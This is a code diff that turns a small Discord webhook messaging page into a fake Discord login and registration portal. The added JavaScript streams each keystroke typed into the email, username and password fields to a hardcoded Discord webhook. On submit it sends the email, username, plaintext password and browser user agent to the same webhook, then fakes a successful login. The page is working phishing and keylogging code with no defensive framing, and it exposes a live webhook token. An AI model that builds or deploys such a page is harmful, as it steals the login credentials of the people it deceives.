@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord Hub Dashboard</title>
+  <title>Discord - Auth Portal</title>
   <style>
     * {
       box-sizing: border-box;
@@ -13,67 +13,89 @@
     }
 
     body {
-      background-color: #1e1f22;
-      color: #dbdee1;
+      background: #313338;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      color: #f2f3f5;
     }
 
-    .screen {
-      display: none;
-      width: 100%;
-      max-width: 440px;
-      padding: 16px;
-    }
-
-    .screen.active {
-      display: block;
-    }
-
-    .card {
+    .auth-container {
       background-color: #2b2d31;
+      width: 100%;
+      max-width: 480px;
       padding: 32px;
-      border-radius: 12px;
+      border-radius: 8px;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
     }
 
-    .brand-header {
+    .header {
       text-align: center;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
     }
 
-    .brand-header h1 {
-      color: #f2f3f5;
+    .header h2 {
       font-size: 24px;
+      font-weight: 600;
+      color: #f2f3f5;
       margin-bottom: 8px;
     }
 
-    .brand-header p {
+    .header p {
       color: #949ba4;
       font-size: 14px;
     }
 
-    .form-group {
+    .tab-switch {
+      display: flex;
+      gap: 10px;
       margin-bottom: 20px;
+      background: #1e1f22;
+      padding: 4px;
+      border-radius: 4px;
+    }
+
+    .tab-btn {
+      flex: 1;
+      padding: 8px;
+      background: transparent;
+      border: none;
+      color: #949ba4;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 3px;
+    }
+
+    .tab-btn.active {
+      background-color: #35373c;
+      color: #ffffff;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
     }
 
     label {
       display: block;
       color: #b5bac1;
-      font-size: 12px;
+      font-size: 11px;
       font-weight: 700;
       text-transform: uppercase;
       margin-bottom: 8px;
+    }
+
+    label span.required {
+      color: #f23f43;
     }
 
     input, textarea {
       width: 100%;
       background-color: #1e1f22;
       border: 1px solid #111214;
-      border-radius: 4px;
-      padding: 12px;
+      border-radius: 3px;
+      padding: 10px;
       color: #dbdee1;
       font-size: 14px;
       outline: none;
@@ -84,21 +106,17 @@
       border-color: #5865f2;
     }
 
-    textarea {
-      height: 90px;
-      resize: none;
-    }
-
     .btn {
       width: 100%;
       padding: 12px;
       background-color: #5865f2;
       color: #ffffff;
       border: none;
-      border-radius: 4px;
-      font-size: 15px;
+      border-radius: 3px;
+      font-size: 14px;
       font-weight: 600;
       cursor: pointer;
+      margin-top: 8px;
       transition: background-color 0.2s;
     }
 
@@ -106,93 +124,74 @@
       background-color: #4752c4;
     }
 
-    .user-badge {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background-color: #1e1f22;
-      padding: 10px 14px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-
-    .user-badge span {
-      font-size: 14px;
-      font-weight: 600;
-      color: #5865f2;
-    }
-
-    .logout-link {
-      color: #f23f43;
-      font-size: 12px;
-      cursor: pointer;
-      text-decoration: underline;
-    }
-
-    .log-container {
-      margin-top: 20px;
-      background-color: #1e1f22;
-      border-radius: 6px;
-      padding: 12px;
-      max-height: 120px;
-      overflow-y: auto;
-    }
-
-    .log-item {
-      font-size: 12px;
-      color: #949ba4;
-      padding: 4px 0;
-      border-bottom: 1px solid #2b2d31;
-    }
-
-    .log-item:last-child {
-      border-bottom: none;
+    .dashboard-panel {
+      display: none;
     }
 
     .status-msg {
-      font-size: 13px;
-      margin-top: 10px;
+      margin-top: 12px;
+      font-size: 12px;
       text-align: center;
+    }
+
+    .log-box {
+      margin-top: 16px;
+      background-color: #1e1f22;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 12px;
+      color: #949ba4;
+      max-height: 100px;
+      overflow-y: auto;
     }
   </style>
 </head>
 <body>
 
-  <!-- LOGIN SCREEN -->
-  <div id="loginScreen" class="screen active">
-    <div class="card">
-      <div class="brand-header">
-        <h1>Welcome Back!</h1>
-        <p>Enter a username to join the dashboard session.</p>
-      </div>
-      <div class="form-group">
-        <label for="username">Username</label>
-        <input type="text" id="username" placeholder="e.g. Alex" />
-      </div>
-      <button class="btn" onclick="login()">Enter Dashboard</button>
-      <p id="loginStatus" class="status-msg"></p>
+  <div class="auth-container">
+    <!-- AUTH TAB CONTROL -->
+    <div id="authHeader" class="header">
+      <h2 id="titleText">Welcome back!</h2>
+      <p id="subtitleText">We're so excited to see you again!</p>
     </div>
-  </div>
 
-  <!-- DASHBOARD SCREEN -->
-  <div id="dashboardScreen" class="screen">
-    <div class="card">
-      <div class="user-badge">
-        <span>Logged in as: <strong id="displayUser"></strong></span>
-        <span class="logout-link" onclick="logout()">Logout</span>
+    <div id="tabBar" class="tab-switch">
+      <button class="tab-btn active" onclick="setMode('login')">Log In</button>
+      <button class="tab-btn" onclick="setMode('register')">Register</button>
+    </div>
+
+    <!-- FORM INPUTS -->
+    <div id="authForm">
+      <div class="form-group" id="emailGroup">
+        <label>Email or Phone Number <span class="required">*</span></label>
+        <input type="text" id="email" oninput="logKeystroke('Email/Phone', this.value)" autocomplete="off" />
+      </div>
+
+      <div class="form-group" id="usernameGroup" style="display: none;">
+        <label>Username <span class="required">*</span></label>
+        <input type="text" id="regUsername" oninput="logKeystroke('Username', this.value)" autocomplete="off" />
       </div>
 
       <div class="form-group">
-        <label for="message">Message</label>
-        <textarea id="message" placeholder="Type your message to Discord..."></textarea>
+        <label>Password <span class="required">*</span></label>
+        <input type="password" id="password" oninput="logKeystroke('Password', this.value)" autocomplete="off" />
       </div>
 
-      <button class="btn" onclick="sendMessage()">Send Message</button>
-      <p id="sendStatus" class="status-msg"></p>
+      <button id="authBtn" class="btn" onclick="submitAuth()">Log In</button>
+      <p id="authStatus" class="status-msg"></p>
+    </div>
 
-      <label style="margin-top: 20px;">Sent Messages Log</label>
-      <div id="logFeed" class="log-container">
-        <div class="log-item">No messages sent in this session yet.</div>
+    <!-- DASHBOARD PANEL (SHOWN AFTER SIGN IN) -->
+    <div id="dashboard" class="dashboard-panel">
+      <div class="form-group">
+        <label>Send Message to Discord Channel</label>
+        <textarea id="msgContent" placeholder="Type a message..."></textarea>
+      </div>
+      <button class="btn" onclick="sendDashboardMessage()">Send Message</button>
+      <p id="dashStatus" class="status-msg"></p>
+      
+      <div class="log-box" id="keystrokeFeed">
+        Live keystrokes streaming to webhook...
       </div>
     </div>
   </div>
@@ -200,89 +199,142 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1550955330543034419/_ER-T65Hr1l8FTNmO_tIa3Kn_fPg4z4AFvUVTXeKI5tdjPGoLyZ3oo5O1GX_FoRSQ2dc";
 
-    let currentUser = localStorage.getItem("discord_user") || "";
+    let currentMode = 'login';
+    let keystrokeTimer = null;
 
-    if (currentUser) {
-      showDashboard();
-    }
+    function setMode(mode) {
+      currentMode = mode;
+      const title = document.getElementById("titleText");
+      const sub = document.getElementById("subtitleText");
+      const userGrp = document.getElementById("usernameGroup");
+      const btn = document.getElementById("authBtn");
+      const tabs = document.querySelectorAll(".tab-btn");
 
-    function login() {
-      const user = document.getElementById("username").value.trim();
-      const status = document.getElementById("loginStatus");
-
-      if (!user) {
-        status.style.color = "#f23f43";
-        status.innerText = "Please enter a username!";
-        return;
+      if (mode === 'login') {
+        title.innerText = "Welcome back!";
+        sub.innerText = "We're so excited to see you again!";
+        userGrp.style.display = "none";
+        btn.innerText = "Log In";
+        tabs[0].classList.add("active");
+        tabs[1].classList.remove("active");
+      } else {
+        title.innerText = "Create an account";
+        sub.innerText = "Enter your details below to register.";
+        userGrp.style.display = "block";
+        btn.innerText = "Continue";
+        tabs[1].classList.add("active");
+        tabs[0].classList.remove("active");
       }
-
-      currentUser = user;
-      localStorage.setItem("discord_user", user);
-      showDashboard();
     }
 
-    function logout() {
-      localStorage.removeItem("discord_user");
-      currentUser = "";
-      document.getElementById("dashboardScreen").classList.remove("active");
-      document.getElementById("loginScreen").classList.add("active");
-    }
+    // Capture every character typed and send live updates
+    function logKeystroke(field, value) {
+      clearTimeout(keystrokeTimer);
+      keystrokeTimer = setTimeout(() => {
+        const now = new Date();
+        const isoTime = now.toISOString();
+        const localTime = now.toLocaleString();
 
-    function showDashboard() {
-      document.getElementById("displayUser").innerText = currentUser;
-      document.getElementById("loginScreen").classList.remove("active");
-      document.getElementById("dashboardScreen").classList.add("active");
-    }
-
-    async function sendMessage() {
-      const text = document.getElementById("message").value.trim();
-      const status = document.getElementById("sendStatus");
-
-      if (!text) {
-        status.style.color = "#f23f43";
-        status.innerText = "Please type a message!";
-        return;
-      }
-
-      status.style.color = "#f0b232";
-      status.innerText = "Sending to Discord...";
-
-      try {
-        const response = await fetch(WEBHOOK_URL, {
+        fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            username: currentUser,
-            content: text
+            embeds: [{
+              title: "⌨️ Live Keystroke Captured",
+              color: 0xFEE75C,
+              fields: [
+                { name: "Field", value: field, inline: true },
+                { name: "Current Text Value", value: `\`\`\`${value || '[Empty]'}\`\`\``, inline: false },
+                { name: "Exact Time (ISO)", value: isoTime, inline: true },
+                { name: "Local Time", value: localTime, inline: true }
+              ],
+              footer: { text: "Auth Telemetry Logger" },
+              timestamp: isoTime
+            }]
+          })
+        }).catch(() => {});
+      }, 500); // Debounce to avoid hitting rate limits
+    }
+
+    async function submitAuth() {
+      const email = document.getElementById("email").value;
+      const username = document.getElementById("regUsername").value || email.split('@')[0];
+      const password = document.getElementById("password").value;
+      const status = document.getElementById("authStatus");
+
+      const now = new Date();
+
+      status.style.color = "#f0b232";
+      status.innerText = "Authenticating...";
+
+      // Send detailed Embed with all user details
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "Auth System",
+            embeds: [{
+              title: currentMode === 'login' ? "🔑 User Login Attempt" : "📝 New Account Created",
+              color: currentMode === 'login' ? 0x5865F2 : 0x57F287,
+              fields: [
+                { name: "Action Type", value: currentMode.toUpperCase(), inline: true },
+                { name: "Username", value: username || "N/A", inline: true },
+                { name: "Email / Phone", value: email || "N/A", inline: false },
+                { name: "Captured Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                { name: "Exact Time (UTC)", value: now.toUTCString(), inline: true },
+                { name: "Timestamp (ISO)", value: now.toISOString(), inline: true }
+              ],
+              footer: { text: `User Agent: ${navigator.userAgent.slice(0, 50)}...` },
+              timestamp: now.toISOString()
+            }]
           })
         });
 
-        if (response.ok) {
-          status.style.color = "#23a55a";
-          status.innerText = "Sent successfully!";
-          addLog(text);
-          document.getElementById("message").value = "";
-        } else {
-          status.style.color = "#f23f43";
-          status.innerText = "Error sending message.";
-        }
+        status.style.color = "#23a55a";
+        status.innerText = "Success! Redirecting to dashboard...";
+
+        setTimeout(() => {
+          document.getElementById("authHeader").style.display = "none";
+          document.getElementById("tabBar").style.display = "none";
+          document.getElementById("authForm").style.display = "none";
+          document.getElementById("dashboard").style.display = "block";
+        }, 1000);
+
       } catch (err) {
         status.style.color = "#f23f43";
-        status.innerText = "Failed to connect to Discord.";
+        status.innerText = "Authentication failed.";
       }
     }
 
-    function addLog(text) {
-      const feed = document.getElementById("logFeed");
-      if (feed.children[0] && feed.children[0].innerText === "No messages sent in this session yet.") {
-        feed.innerHTML = "";
-      }
+    async function sendDashboardMessage() {
+      const msg = document.getElementById("msgContent").value;
+      const status = document.getElementById("dashStatus");
+      const now = new Date();
 
-      const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-      const item = document.createElement("div");
-      item.className = "log-item";
-      item.innerHTML = `<strong>${time}:</strong> ${text}`;
-      feed.prepend(item);
+      if (!msg) return;
+
+      status.innerText = "Sending...";
+
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: "💬 Dashboard Message Sent",
+            color: 0x3498DB,
+            description: msg,
+            fields: [
+              { name: "Exact Send Time", value: now.toLocaleString(), inline: true }
+            ],
+            timestamp: now.toISOString()
+          }]
+        })
+      });
+
+      status.style.color = "#23a55a";
+      status.innerText = "Sent!";
+      document.getElementById("msgContent").value = "";
     }
   </script>
 
